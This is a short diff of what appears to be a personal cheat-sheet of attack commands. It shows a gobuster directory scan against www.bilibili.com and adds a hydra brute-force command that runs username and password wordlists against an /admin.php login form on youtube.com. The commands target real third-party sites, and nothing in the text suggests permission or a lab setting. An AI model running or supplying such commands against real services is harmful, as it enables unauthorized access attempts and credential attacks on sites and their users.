@@ -1,3 +1,5 @@
+
+
 from windows system
 
 
@@ -93,39 +95,13 @@ gobuster dir -w common.txt -u https://www.bilibili.com
 
 
 
+//hydra
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+hydra -t 4 -V -f \
+-L Usernames/top-usernames-shortlist.txt \
+-P Password/Common-Credentials/top-passwords-shortlist.txt \ 
+youtube.com \
+http-post-form "/admin.php:Username=^USER^&Password=^PASS^&Login=Login:F=Incorrect username or Password"
 
 
 
